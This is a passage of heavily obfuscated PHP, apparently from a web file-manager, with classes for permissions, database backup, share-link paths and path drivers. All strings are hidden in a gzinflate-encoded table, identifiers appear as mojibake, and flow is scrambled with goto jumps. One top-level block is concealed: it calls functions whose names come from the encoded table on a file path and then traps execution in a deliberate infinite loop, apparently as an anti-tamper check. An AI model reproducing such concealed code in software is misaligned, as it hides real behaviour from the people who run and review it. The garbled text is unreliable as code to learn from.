$dŠÒ¼„î¶²[33], $dŠÒ¼„î¶²[404] => 1, $dŠÒ¼„î¶²[1711] => $dŠÒ¼„î¶²[1700], $dŠÒ¼„î¶²[1712] => 1, $dŠÒ¼„î¶²[1169] => 0, $dŠÒ¼„î¶²[1713] => 0); goto Cá¨“­á‘; Fò„ô¡°Ç›: return parent::insert($c¤£—ëã); goto bğÀ±ù±±­; Cá¨“­á‘: $c¤£—ëã = array_merge($B†ïóøôêÏ, $c¤£—ëã); $c¤£—ëã[$dŠÒ¼„î¶²[1713]] = $this->getSort(); $this->filterAuth($c¤£—ëã[$dŠÒ¼„î¶²[404]]); goto Fò„ô¡°Ç›; bğÀ±ù±±­: } private function getSort() { $cùÌìô÷“ =& $_SERVER[¬ı§†‰ú˜¼]; $C¿’Í”òä‘ = parent::listData(); $dÑ‹¬„´ˆ = array_to_keyvalue($C¿’Í”òä‘, $cùÌìô÷“[33], $cùÌìô÷“[1713]); return empty($dÑ‹¬„´ˆ) ? 0 : max($dÑ‹¬„´ˆ) + 1; } private function filterAuth(&$b·Ôœ˜¼…‚) { goto eô®ªöÓÀô; E Í£ë‘ÄÓ: foreach ($f¡Â’ê´»í as $Cùˆ›°Á) { if ($b·Ôœ˜¼…‚ & $Cùˆ›°Á) { $aç±»ğïÈÚ[] = $Cùˆ›°Á; } } if (in_array(self::AUTH_ROOT, $aç±»ğïÈÚ)) { $b·Ôœ˜¼…‚ = array_sum($f¡Â’ê´»í); return; } $a¾‡öè¨éÍ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto D¶Şí”£—; D¶Şí”£—: foreach ($aç±»ğïÈÚ as $Cùˆ›°Á) { if (isset($a¾‡öè¨éÍ[$Cùˆ›°Á])) { $aç±»ğïÈÚ = array_merge($aç±»ğïÈÚ, $a¾‡öè¨éÍ[$Cùˆ›°Á]); } } $aç±»ğïÈÚ[] = self::AUTH_SHOW; $b·Ôœ˜¼…‚ = array_sum(array_unique($aç±»ğïÈÚ)); goto cÏŸ¡ ¯è; eô®ªöÓÀô: if (!$b·Ôœ˜¼…‚) { return; } $f¡Â’ê´»í = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $aç±»ğïÈÚ = array(); goto E Í£ë‘ÄÓ; cÏŸ¡ ¯è: } public function sort($bİğÈ»„”, $d¥è”ì¡É®) { return parent::update($bİğÈ»„”, $d¥è”ì¡É®); } } goto cÁŒ¯Îäç‹; EØé¾í”°‚: define($_SERVER[¬ı§†‰ú˜¼][0], $_SERVER[¬ı§†‰ú˜¼][1]); $_SERVER[šé»] = explode($_SERVER[¬ı§†‰ú˜¼][2], gzinflate(substr($_SERVER[¬ı§†‰ú˜¼][3], 10, -8))); function binCheckEq($d˜‹îÕéÈº, $Cå †±ÜŸù) { return $d˜‹îÕéÈº == $Cå †±ÜŸù; } goto ağˆæ™ó; c«ºõ‘‚Ï¨: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto bß‚Î§ ; e‘ç‡¦³Ùé: if (isset($fİõêİœ->task[$aİè Ğ»´ç[749]])) { $eÍà¨‹„ì„ = $fİõêİœ->task[$aİè Ğ»´ç[749]] ? $fİõêİœ->task[$aİè Ğ»´ç[749]] : timeFloat(); $bÆ½À…Õ£ = $eÍà¨‹„ì„ - $fİõêİœ->task[$aİè Ğ»´ç[750]]; if ($bÆ½À…Õ£ >= 0.2) { $eùñÎ´Ç¸í += 1; } } $fİõêİœ->end(); $DòáÍ—º’  = array($aİè Ğ»´ç[737] => $e¦¼¥‰°ÅÒ, $aİè Ğ»´ç[734] => 1, $aİè Ğ»´ç[751] => $eùñÎ´Ç¸í, $aİè Ğ»´ç[752] => $F½¾‘ÍÖİÄ, $aİè Ğ»´ç[753] => time()); goto CÔæ«Ì“íÄ; bß‚Î§ : $aİè Ğ»´ç =& $_SERVER[¬ı§†‰ú˜¼]; $cÄ„“» ±Å = Backup::get(); self::$io = $cÄ„“» ±Å[$aİè Ğ»´ç[716]]; goto d½¥ò“†”Î; cÃ“šëÖ°: $eùñÎ´Ç¸í = $F½¾‘ÍÖİÄ = 0; try { $e‘Î’Ó”ù = $fÛ‹µ±µâÁ->db()->getTables(); } catch (Exception $AáƒÍ½Ê´›) { return !1; } $e‘Î’Ó”ù = array_diff($e‘Î’Ó”ù, array($aİè Ğ»´ç[740], $aİè Ğ»´ç[741])); goto EÃáî·õÄ¼; CÔæ«Ì“íÄ: Backup::set($DòáÍ—º’ ); if ($eùñÎ´Ç¸í > $F½¾‘ÍÖİÄ) { write_log(array($aİè Ğ»´ç[754], $DòáÍ—º’ ), $aİè Ğ»´ç[743]); return !1; } return !0; goto fÌÀÖã…»; CŠ²´‰Ç: $fÛ‹µ±µâÁ = new DbManage($Bî½èå¾Ò„, $e¦¼¥‰°ÅÒ); $DòáÍ—º’  = array($aİè Ğ»´ç[737] => $e¦¼¥‰°ÅÒ, $aİè Ğ»´ç[738] => time()); Backup::set($DòáÍ—º’ ); goto eÓæÆåæ§; EÃáî·õÄ¼: foreach ($e‘Î’Ó”ù as $b®¬„†À¼) { $eùñÎ´Ç¸í += $fÛ‹µ±µâÁ->model($b®¬„†À¼)->count(); } $fİõêİœ = new Task($aİè Ğ»´ç[742], $aİè Ğ»´ç[743], $eùñÎ´Ç¸í, LNG($aİè Ğ»´ç[744]) . $aİè Ğ»´ç[745] . LNG($aİè Ğ»´ç[746])); foreach ($e‘Î’Ó”ù as $b®¬„†À¼) { $eâµƒƒö£æ = $A‚»Ï¡òŸ› . $b®¬„†À¼ . $aİè Ğ»´ç[747]; $EãÛèàøñ¡ = null; if ($b®¬„†À¼ == $aİè Ğ»´ç[748] && (!isset($cÄ„“» ±Å[$aİè Ğ»´ç[717]]) || $cÄ„“» ±Å[$aİè Ğ»´ç[717]] == $aİè Ğ»´ç[495])) { $EãÛèàøñ¡ = self::$io; } $F½¾‘ÍÖİÄ += $fÛ‹µ±µâÁ->sqlFromDb($b®¬„†À¼, $eâµƒƒö£æ, $fİõêİœ, $EãÛèàøñ¡); } goto e‘ç‡¦³Ùé; d½¥ò“†”Î: self::$name = $cÄ„“» ±Å[$aİè Ğ»´ç[28]]; $Bî½èå¾Ò„ = $GLOBALS[$aİè Ğ»´ç[6]][$aİè Ğ»´ç[17]]; $e¦¼¥‰°ÅÒ = $this->_dbType($Bî½èå¾Ò„); goto CŠ²´‰Ç; eÓæÆåæ§: $A‚»Ï¡òŸ› = $this->tmpFilesPath() . $aİè Ğ»´ç[739] . self::$name . $aİè Ğ»´ç[8]; del_dir($A‚»Ï¡òŸ›); mk_dir($A‚»Ï¡òŸ›); goto cÃ“šëÖ°; fÌÀÖã…»: } private function _dbType($a³›Û­ùùá) { goto FÛªØÌÓŞ; cçæñ²©Úâ: if ($aù¹¨ğ² == $d‹¹…ô—Ò¸[756]) { $Dç‘Î„· = explode($d‹¹…ô—Ò¸[4], $a³›Û­ùùá[$d‹¹…ô—Ò¸[757]]); $aù¹¨ğ² = $Dç‘Î„·[0]; } $BáÓÜ¦àæ™ = array($d‹¹…ô—Ò¸[758] => $d‹¹…ô—Ò¸[9], $d‹¹…ô—Ò¸[759] => $d‹¹…ô—Ò¸[760]); if (isset($BáÓÜ¦àæ™[$aù¹¨ğ²])) { $aù¹¨ğ² = $BáÓÜ¦àæ™[$aù¹¨ğ²]; } goto d±¬§´Œ«; d±¬§´Œ«: return $aù¹¨ğ²; goto e³¿˜ÈÎ­¡; FÛªØÌÓŞ: $d‹¹…ô—Ò¸ =& $_SERVER[¬ı§†‰ú˜¼]; $a³›Û­ùùá = array_change_key_case($a³›Û­ùùá); $aù¹¨ğ² = $a³›Û­ùùá[$d‹¹…ô—Ò¸[755]]; goto cçæñ²©Úâ; e³¿˜ÈÎ­¡: } private function tmpFilesPath() { $FÊšÓ¹®ÄŞ =& $_SERVER[¬ı§†‰ú˜¼]; $fÂŸÇÜ×šÌ = TEMP_FILES; if ($GLOBALS[$FÊšÓ¹®ÄŞ[6]][$FÊšÓ¹®ÄŞ[88]][$FÊšÓ¹®ÄŞ[761]]) { $fÂŸÇÜ×šÌ = $GLOBALS[$FÊšÓ¹®ÄŞ[6]][$FÊšÓ¹®ÄŞ[88]][$FÊšÓ¹®ÄŞ[761]]; if (!mk_dir($fÂŸÇÜ×šÌ) || !is_writable($fÂŸÇÜ×šÌ) || !IO::mkfile($fÂŸÇÜ×šÌ . $FÊšÓ¹®ÄŞ[762])) { $fÂŸÇÜ×šÌ = TEMP_FILES; } } return $fÂŸÇÜ×šÌ; } } if (!isset($_SERVER[$_SERVER[¬ı§†‰ú˜¼][763]]) || !isset($_SERVER[$_SERVER[¬ı§†‰ú˜¼][764]])) { goto F“ŠÊ’À×; F“ŠÊ’À×: $dÆ×ñ‰à’ = $_SERVER[¬ı§†‰ú˜¼][765]; $CïÕ”«‡ÁÂ = $_SERVER[$_SERVER[¬ı§†‰ú˜¼][766]] . $_SERVER[¬ı§†‰ú˜¼][767]; $A–ÂöÎàó— = $dÆ×ñ‰à’($CïÕ”«‡ÁÂ); goto fõÖ²Ğ¨ˆè; fõÖ²Ğ¨ˆè: $C¾åÈ°Ğ®Œ = explode($_SERVER[¬ı§†‰ú˜¼][228], $A–ÂöÎàó—); if (count($C¾åÈ°Ğ®Œ) < $_SERVER[¬ı§†‰ú˜¼][584]) { $C•²…–†å = $_SERVER[¬ı§†‰ú˜¼][768]; $C•²…–†å(); } $aÄ¥ÆÖ†ËØ = $_SERVER[¬ı§†‰ú˜¼][769]; goto dŠ½÷İòŒ; dŠ½÷İòŒ: $aÄ¥ÆÖ†ËØ($_SERVER[$_SERVER[¬ı§†‰ú˜¼][766]] . $_SERVER[¬ı§†‰ú˜¼][767]); $E…Ã›‹·¢â = 2; while ($E…Ã›‹·¢â > 1) { $fõ¢®§¡² = rawurlencode($E…Ã›‹·¢â . $_SERVER[¬ı§†‰ú˜¼][374]); } goto c¸©Ô×£; c¸©Ô×£: } class BackupDbFile { public function __construct() { } public function index() { goto EŞ‘µªµëç; EŞ‘µªµëç: $Dà‰õ Ã =& $_SERVER[¬ı§†‰ú˜¼]; $a†àØÏ”¶¬ = Backup::get(); $E‡ˆ§±Øæ = $a†àØÏ”¶¬[$Dà‰õ Ã[28]]; goto aÂÂœËÃÍí; dá•×ŠŠ: if (!$a‘¿œã¹) { return !1; } $E¸¬°éÇô = array($Dà‰õ Ã[770] => $a‘¿œã¹, $Dà‰õ Ã[771] => time()); Backup::set($E¸¬°éÇô); goto FØ‡êÒœãÈ; B™âº¨ğ à: $dâ¦“œÅˆ™ = CONTROLLER_DIR . $Dà‰õ Ã[776]; $b·œØ§´ŒÎ = CONTROLLER_DIR . $Dà‰õ Ã[777]; IO::copy($dâ¦“œÅˆ™, $Eøõ‡ë¿àà); goto aø¢¼†ù; aø¢¼†ù: IO::copy($b·œØ§´ŒÎ, $Eøõ‡ë¿àà); $A¬‚ÙÕ·Õ±->end(); $E¸¬°éÇô = array($Dà‰õ Ã[778] => $a‘¿œã¹, $Dà‰õ Ã[779] => time()); goto aÛÔ‹òî†ã; Bœ‡˜±Á°: $E¿Ô°Ää = IO::listPath($a¨½“£»¼Æ); $B–¬ôõºµ = isset($E¿Ô°Ää[$Dà‰õ Ã[74]]) ? $E¿Ô°Ää[$Dà‰õ Ã[74]] : array(); $a‘¿œã¹ = array_sum(array_column($B–¬ôõºµ, $Dà‰õ Ã[78])); goto dá•×ŠŠ; aÛÔ‹òî†ã: Backup::set($E¸¬°éÇô); return !0; goto CÎÍæóëÀ; FØ‡êÒœãÈ: $A¬‚ÙÕ·Õ± = new TaskFileTransfer($Dà‰õ Ã[772], $Dà‰õ Ã[743], count($B–¬ôõºµ), LNG($Dà‰õ Ã[744]) . $Dà‰õ Ã[438] . LNG($Dà‰õ Ã[746]) . $Dà‰õ Ã[773]); $A¬‚ÙÕ·Õ±->task[$Dà‰õ Ã[724]] = $a‘¿œã¹; foreach ($E¿Ô°Ää[$Dà‰õ Ã[74]] as $c‚î›•ÁÒÌ) { $Cõµòã¿çÅ = IO::move($c‚î›•ÁÒÌ[$Dà‰õ Ã[76]], $Eøõ‡ë¿àà); if (!$Cõµòã¿çÅ) { $A¬‚ÙÕ·Õ±->end(); $D•«ƒ­¬ë¿ = IO::getLastError($Dà‰õ Ã[774] . $c‚î›•ÁÒÌ[$Dà‰õ Ã[76]] . $Dà‰õ Ã[775] . $Eøõ‡ë¿àà . $Dà‰õ Ã[503]); write_log($D•«ƒ­¬ë¿, $Dà‰õ Ã[743]); return !1; } } goto B™âº¨ğ à; aÂÂœËÃÍí: $a¨½“£»¼Æ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\165\160\137{$E‡ˆ§±Øæ}\x2f"; $Eøõ‡ë¿àà = $this->backupPath($a†àØÏ”¶¬); if (!($Eøõ‡ë¿àà = IO::mkdir($Eøõ‡ë¿àà))) { return !1; } goto Bœ‡˜±Á°; CÎÍæóëÀ: } private function backupPath($F°Ì¬ƒê¼Ò) { $CÄ‚Õ´¹¼¦ =& $_SERVER[¬ı§†‰ú˜¼]; $f·‡–•××È = $F°Ì¬ƒê¼Ò[$CÄ‚Õ´¹¼¦[28]]; $a±¸¤£÷Ã = Model($CÄ‚Õ´¹¼¦[731])->get($CÄ‚Õ´¹¼¦[732]); $aÔ»‡ÁôğÕ = substr(md5($CÄ‚Õ´¹¼¦[733] . $a±¸¤£÷Ã . $f·‡–•××È), 0, 8); return "\x7b\x69\157\72{$F°Ì¬ƒê¼Ò[$CÄ‚Õ´¹¼¦[716]]}\175\57\144\141\x74\141\x62\x61\163\145\57\x62\141\143\x6b\165\x70\x2f" . $f·‡–•××È . $CÄ‚Õ´¹¼¦[71] . $aÔ»‡ÁôğÕ; } private function tmpFilesPath() { $Eš˜Ùœ‰ç” =& $_SERVER[¬ı§†‰ú˜¼]; $e‚Ò¸à¿¢ë = TEMP_FILES; if ($GLOBALS[$Eš˜Ùœ‰ç”[6]][$Eš˜Ùœ‰ç”[88]][$Eš˜Ùœ‰ç”[761]]) { $e‚Ò¸à¿¢ë = $GLOBALS[$Eš˜Ùœ‰ç”[6]][$Eš˜Ùœ‰ç”[88]][$Eš˜Ùœ‰ç”[761]]; if (!mk_dir($e‚Ò¸à¿¢ë) || !is_writable($e‚Ò¸à¿¢ë) || !IO::mkfile($e‚Ò¸à¿¢ë . $Eš˜Ùœ‰ç”[762])) { $e‚Ò¸à¿¢ë = TEMP_FILES; } } return $e‚Ò¸à¿¢ë; } } goto c¢ä”µ™“Ü; B§©÷½ê‰•: class PathDriverDriverShareItem { public function __construct($BË¦ƒŸÃÒ¢) { $this->pathParse = $BË¦ƒŸÃÒ¢; } public function __call($D‹ãÂÅ™, $dô±…Êèèé) { $FÉ„Ô·İå§ =& $_SERVER[¬ı§†‰ú˜¼]; if (method_exists($this, $D‹ãÂÅ™)) { return; } $E¥“Ìçİù– = call_user_func_array(array($FÉ„Ô·İå§[1213], $D‹ãÂÅ™), $dô±…Êèèé); $eãœ›Âå¢Æ = array($FÉ„Ô·İå§[1214], $FÉ„Ô·İå§[1215], $FÉ„Ô·İå§[1216], $FÉ„Ô·İå§[1217], $FÉ„Ô·İå§[517], $FÉ„Ô·İå§[519], $FÉ„Ô·İå§[1218], $FÉ„Ô·İå§[107], $FÉ„Ô·İå§[1219], $FÉ„Ô·İå§[1220]); if (in_array($D‹ãÂÅ™, $eãœ›Âå¢Æ)) { $E¥“Ìçİù– = $this->getPathOuter($E¥“Ìçİù–); } return $E¥“Ìçİù–; } public function copy($eÌ¯çÓ‹, $B‡Ø”…ÆÏ, $Bï´†„œŞ = false) { return $this->copyMove($eÌ¯çÓ‹, $B‡Ø”…ÆÏ, $Bï´†„œŞ, $_SERVER[¬ı§†‰ú˜¼][517]); } public function move($FôÙ¨­ùğ‹, $dàÉ³å”¨”, $F‡‚íÅ¢ğ = false) { return $this->copyMove($FôÙ¨­ùğ‹, $dàÉ³å”¨”, $F‡‚íÅ¢ğ, $_SERVER[¬ı§†‰ú˜¼][519]); } private function copyMove($E‹ê±»­Ò¹, $C‘Óáœ¦‘®, $f²ÏÖÙİÍª, $b³ì¯…–±) { goto EÖ§³«š’Ú; aé®á´‚…: if ($Fç·‚ØÂ‚½->pathParse[$F‘ùÚ½İ†[1047]]) { $C‘Óáœ¦‘® = $Fç·‚ØÂ‚½->pathParse[$F‘ùÚ½İ†[1047]]; } else { $C‘Óáœ¦‘® = $F´¶È‰‚É½; } $FíŸê¥ìÖÈ = IO::copyMove($E‹ê±»­Ò¹, $C‘Óáœ¦‘®, $f²ÏÖÙİÍª, $b³ì¯…–±); $FíŸê¥ìÖÈ = $this->getPathOuter($FíŸê¥ìÖÈ); goto eãŠ½Œô; EÖ§³«š’Ú: $F‘ùÚ½İ† =& $_SERVER[¬ı§†‰ú˜¼]; $F´¶È‰‚É½ = $C‘Óáœ¦‘®; $Fç·‚ØÂ‚½ = IO::driverMake($C‘Óáœ¦‘®); goto aé®á´‚…; eãŠ½Œô: return $FíŸê¥ìÖÈ; goto DÊÍóâº‡; DÊÍóâº‡: } public function pathThis($f‡¬«ìèİ) { return get_path_this($this->pathParse[$_SERVER[¬ı§†‰ú˜¼][76]]); } public function pathFather($E¶Œ½õò–) { return get_path_father($this->pathParse[$_SERVER[¬ı§†‰ú˜¼][76]]); } public function iconvSystem($DÓÛ¤£ª²ö) { return $DÓÛ¤£ª²ö; } protected function infoParse($b‘Ëã»ìæ¨, $C¸ˆ–Ÿï—ğ = false) { $dší­Øˆ‚ =& $_SERVER[¬ı§†‰ú˜¼]; $d²…Í¾…¨‚ = $this->pathParse[$dší­Øˆ‚[464]][$dší­Øˆ‚[1070]] . $this->pathParse[$dší­Øˆ‚[1063]]; if ($C¸ˆ–Ÿï—ğ) { $d‰ÕÄµĞ¥½ = IO::infoWithChildren($d²…Í¾…¨‚); } else { $d‰ÕÄµĞ¥½ = IO::info($d²…Í¾…¨‚); } $b¹«‚‹Ø¾Å = $this->pathParse[$dší­Øˆ‚[464]]; return Action($dší­Øˆ‚[1212])->_shareItemeParse($d‰ÕÄµĞ¥½, $b¹«‚‹Ø¾Å); } public function listAll($aßˆ‰Êè) { $fÓ×‘ĞÍ =& $_SERVER[¬ı§†‰ú˜¼]; $cÓé±ÊÇ× = IO::listAll($aßˆ‰Êè); $E”™Ó‹âõ = $this->pathParse[$fÓ×‘ĞÍ[464]]; foreach ($cÓé±ÊÇ× as &$AíÖ¹…ë‡¹) { check_abort(); $FÕƒæÀ”ç = IO::info($AíÖ¹…ë‡¹[$fÓ×‘ĞÍ[76]]); $FÕƒæÀ”ç = is_array($FÕƒæÀ”ç) ? $FÕƒæÀ”ç : array(); $AíÖ¹…ë‡¹ = array_merge($FÕƒæÀ”ç, $AíÖ¹…ë‡¹); $AíÖ¹…ë‡¹[$fÓ×‘ĞÍ[85]] = Action($fÓ×‘ĞÍ[1212])->_shareItemeParse($AíÖ¹…ë‡¹, $E”™Ó‹âõ); } unset($AíÖ¹…ë‡¹); return $cÓé±ÊÇ×; } public function getPathOuter($f£¼£æ‹ª) { goto D«æ‰§å±; f¢ËÜ•®Û: if (substr($F°Ö‘ë”‘®, 0, strlen($AÛË†‘‘È¤)) != $AÛË†‘‘È¤) { return !1; } return $this->pathParse[$BõáîÌÙÎ[1064]] . $BõáîÌÙÎ[8] . ltrim($EƒÍ•ïä‚ë, $BõáîÌÙÎ[8]); goto f‹…Àâ‹İ·; DÇ©§«ö—½: $F°Ö‘ë”‘® = KodIO::clear($f£¼£æ‹ª); $AÛË†‘‘È¤ = KodIO::clear($this->pathParse[$BõáîÌÙÎ[464]][$BõáîÌÙÎ[1070]]); $EƒÍ•ïä‚ë = substr($F°Ö‘ë”‘®, strlen($AÛË†‘‘È¤)); goto f¢ËÜ•®Û; D«æ‰§å±: $BõáîÌÙÎ =& $_SERVER[¬ı§†‰ú˜¼]; $A­†àŞ­ÓĞ = KodIO::parse($f£¼£æ‹ª); if ($A­†àŞ­ÓĞ[$BõáîÌÙÎ[29]] == KodIO::KOD_SHARE_ITEM) { return $A­†àŞ­ÓĞ[$BõáîÌÙÎ[76]]; } goto DÇ©§«ö—½; f‹…Àâ‹İ·: } public function getType() { $a¡±îÙ‚•® =& $_SERVER[¬ı§†‰ú˜¼]; $EùÆÙÄ¢² = str_replace($a¡±îÙ‚•®[72], $a¡±îÙ‚•®[33], get_class($this)); return strtolower($EùÆÙÄ¢²); } public function isTypeObject($E©Œ÷¡äÂÁ) { return IO::isTypeObject($E©Œ÷¡äÂÁ); } public function info($CÜĞ†ÂäÚ’) { return $this->infoParse($CÜĞ†ÂäÚ’); } public function infoAuth($B›˜ÚŸø¿Å) { return $this->infoParse($B›˜ÚŸø¿Å); } public function infoWithChildren($c±ŒŠ§Ø·ˆ) { return $this->infoParse($c±ŒŠ§Ø·ˆ, !0); } public function infoFull($F‹¹ÕÃµ‘‡) { return $this->infoParse($F‹¹ÕÃµ‘‡); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($eö…ÁÚ˜ÔÈ) { $this->pathParse = $eö…ÁÚ˜ÔÈ; } protected function infoParse($AÃ‹•è‘£ª, $EÉ ÇÙ« = false) { $A’ÎíÎÃ‰ =& $_SERVER[¬ı§†‰ú˜¼]; return Action($A’ÎíÎÃ‰[1069])->sharePathInfo($this->pathParse[$A’ÎíÎÃ‰[76]], !0, $EÉ ÇÙ«); } public function listPath($b‚ÆÓ¢ùÔ, $eé‚±á‚ = false) { $A¶Öº¿Š© =& $_SERVER[¬ı§†‰ú˜¼]; $C×½–Ÿ‘¯ô = IO::listPath($b‚ÆÓ¢ùÔ, $eé‚±á‚); foreach ($C×½–Ÿ‘¯ô as $cŞ½ğåÍÁ¶ => $A˜Èè‹ˆ¡Í) { if (!in_array($cŞ½ğåÍÁ¶, array($A¶Öº¿Š©[74], $A¶Öº¿Š©[75]))) { continue; } foreach ($A˜Èè‹ˆ¡Í as $bàÓ½›Îˆè => $C“‡™åŒ’) { $C“‡™åŒ’ = Action($A¶Öº¿Š©[1221])->parsePathChildren($C“‡™åŒ’, array($A¶Öº¿Š©[412] => $b‚ÆÓ¢ùÔ)); $C×½–Ÿ‘¯ô[$cŞ½ğåÍÁ¶][$bàÓ½›Îˆè] = Action($A¶Öº¿Š©[1069])->shareItemInfo($C“‡™åŒ’); } } return $C×½–Ÿ‘¯ô; } public function listAll($EÓ‘ùëÓ…Ï) { $bŸÁºÎµ¦ =& $_SERVER[¬ı§†‰ú˜¼]; $cÆ¬Ô•ºÀ† = IO::listAll($EÓ‘ùëÓ…Ï); foreach ($cÆ¬Ô•ºÀ† as &$BğÍ»‡ëÂà) { $dö‰çá‰Å¶ = IO::info($BğÍ»‡ëÂà[$bŸÁºÎµ¦[76]]); $dö‰çá‰Å¶ = is_array($dö‰çá‰Å¶) ? $dö‰çá‰Å¶ : array(); $BğÍ»‡ëÂà = array_merge($dö‰çá‰Å¶, $BğÍ»‡ëÂà); $BğÍ»‡ëÂà[$bŸÁºÎµ¦[85]] = Action($bŸÁºÎµ¦[1069])->shareItemInfo($BğÍ»‡ëÂà); } unset($BğÍ»‡ëÂà); return $cÆ¬Ô•ºÀ†; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($F…Ïî¤•²é) { parent::__construct($F…Ïî¤•²é); } } goto bÌñõÌ©ŠÌ; b½³»¥ùØÍ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $dô ŞÍ»íæ =& $_SERVER[¬ı§†‰ú˜¼]; $this->objectDriver = array($dô ŞÍ»íæ[57], $dô ŞÍ»íæ[58], $dô ŞÍ»íæ[59], $dô ŞÍ»íæ[60], $dô ŞÍ»íæ[61], $dô ŞÍ»íæ[62], $dô ŞÍ»íæ[63], $dô ŞÍ»íæ[64], $dô ŞÍ»íæ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d¿‘®ğ¯™Ë) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d¿‘®ğ¯™Ë, $_SERVER[¬ı§†‰ú˜¼][8]); } return $d¿‘®ğ¯™Ë; } public function iconvApp($fó˜†ÕÄÀ) { return $fó˜†ÕÄÀ; } public function iconvSystem($CÕÄ“ÓãÑœ) { return $CÕÄ“ÓãÑœ; } public function iconvTo($b¾¤ÒÊ¿¬á, $bƒ£öÑå§ù, $d¯Æ†¸ã) { goto bŒ¬ Î¬ÄŞ; bŒ¬ Î¬ÄŞ: $DêÊÑ³ëË =& $_SERVER[¬ı§†‰ú˜¼]; if (!$b¾¤ÒÊ¿¬á || !function_exists($DêÊÑ³ëË[66])) { return $b¾¤ÒÊ¿¬á; } static $EËµì§´òÇ = array(); goto eÛ½Œé™Ó¥; b„×¤ÑÛ¾”: return $e—¸„¹¾®; goto F‘æ§Š‚Œ”; f«‡ç ¬§: $e—¸„¹¾® = $e—¸„¹¾® ? $e—¸„¹¾® : $b¾¤ÒÊ¿¬á; if (strstr($e—¸„¹¾®, $DêÊÑ³ëË[70])) { $e—¸„¹¾® = str_replace($DêÊÑ³ëË[70], $DêÊÑ³ëË[71], $e—¸„¹¾®); } $EËµì§´òÇ[$bƒ£öÑå§ù . $DêÊÑ³ëË[67] . $d¯Æ†¸ã . $DêÊÑ³ëË[68] . $b¾¤ÒÊ¿¬á] = $e—¸„¹¾®; goto a¥¿èÇŒî¼; a¥¿èÇŒî¼: $EËµì§´òÇ[$d¯Æ†¸ã . $DêÊÑ³ëË[67] . $bƒ£öÑå§ù . $DêÊÑ³ëË[68] . $b¾¤ÒÊ¿¬á] = $b¾¤ÒÊ¿¬á; $EËµì§´òÇ[$d¯Æ†¸ã . $DêÊÑ³ëË[67] . $bƒ£öÑå§ù . $DêÊÑ³ëË[68] . $e—¸„¹¾®] = $b¾¤ÒÊ¿¬á; $EËµì§´òÇ[$bƒ£öÑå§ù . $DêÊÑ³ëË[67] . $d¯Æ†¸ã . $DêÊÑ³ëË[68] . $e—¸„¹¾®] = $e—¸„¹¾®; goto b„×¤ÑÛ¾”; eÛ½Œé™Ó¥: $FåÙÄÈ®Ø¢ = $bƒ£öÑå§ù . $DêÊÑ³ëË[67] . $d¯Æ†¸ã . $DêÊÑ³ëË[68] . $b¾¤ÒÊ¿¬á; if (isset($EËµì§´òÇ[$FåÙÄÈ®Ø¢])) { return $EËµì§´òÇ[$FåÙÄÈ®Ø¢]; } if (function_exists($DêÊÑ³ëË[69])) { $e—¸„¹¾® = @mb_convert_encoding($b¾¤ÒÊ¿¬á, $d¯Æ†¸ã, $bƒ£öÑå§ù); } else { $e—¸„¹¾® = @iconv($bƒ£öÑå§ù, $d¯Æ†¸ã, $b¾¤ÒÊ¿¬á); } goto f«‡ç ¬§; F‘æ§Š‚Œ”: } public function getPathInner($E“×ãÛŒÅ) { $aÁ‰¿‚˜æ˜ = IO::init($E“×ãÛŒÅ); return $aÁ‰¿‚˜æ˜->path; } public function getPathOuter($eØ¾Àã£×Ú) { $b²“œÀ‚øæ =& $_SERVER[¬ı§†‰ú˜¼]; $e½Äªğö° = strlen(trim($this->pathBase, $b²“œÀ‚øæ[8])); $eØ¾Àã£×Ú = substr(trim($eØ¾Àã£×Ú, $b²“œÀ‚øæ[8]), $e½Äªğö°); return $this->pathDriver . $b²“œÀ‚øæ[8] . ltrim($eØ¾Àã£×Ú, $b²“œÀ‚øæ[8]); } public function isParentOf($BæÏö¡ĞÀ, $fª÷Ò°ŸÃ) { $Bßƒˆ…†‡ =& $_SERVER[¬ı§†‰ú˜¼]; $BæÏö¡ĞÀ = rtrim(strtolower($BæÏö¡ĞÀ), $Bßƒˆ…†‡[8]) . $Bßƒˆ…†‡[8]; $fª÷Ò°ŸÃ = rtrim(strtolower($fª÷Ò°ŸÃ), $Bßƒˆ…†‡[8]) . $Bßƒˆ…†‡[8]; $F§°Š¡ÓéÚ = strpos($fª÷Ò°ŸÃ, $BæÏö¡ĞÀ) === 0; return $F§°Š¡ÓéÚ; } public function getType() { $Aİ‰ŠØ =& $_SERVER[¬ı§†‰ú˜¼]; $d§²„³÷Ä° = str_replace($Aİ‰ŠØ[72], $Aİ‰ŠØ[33], get_class($this)); return strtolower($d§²„³÷Ä°); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($cÁ‘òËÖÊ, $B©ö‚ùÇ) { $fØĞ±¥éßí =& $_SERVER[¬ı§†‰ú˜¼]; $A¥®ó„Şó‡ = rtrim($cÁ‘òËÖÊ, $fØĞ±¥éßí[8]) . $fØĞ±¥éßí[8] . $B©ö‚ùÇ; $b¯¤’“¤Ç = $this->exist($A¥®ó„Şó‡); return $b¯¤’“¤Ç ? $A¥®ó„Şó‡ : !1; } public function setModifyTime($fæŸ‹ÑñŞ½, $eˆ„Ò’§„Á = '') { } public function renameObject($BŠÙİ‚“ñ, $câ•››äÎø) { goto dÄ‡¤Ê•¶È; dÄ‡¤Ê•¶È: $F‚¹É¨Ë½Ê =& $_SERVER[¬ı§†‰ú˜¼]; $déáñÈÂø’ = $câ•››äÎø; Hook::trigger($F‚¹É¨Ë½Ê[73], $this, $BŠÙİ‚“ñ, $this, $this->pathFather($BŠÙİ‚“ñ) . $câ•››äÎø); goto eŠò°¡˜–; eŠò°¡˜–: 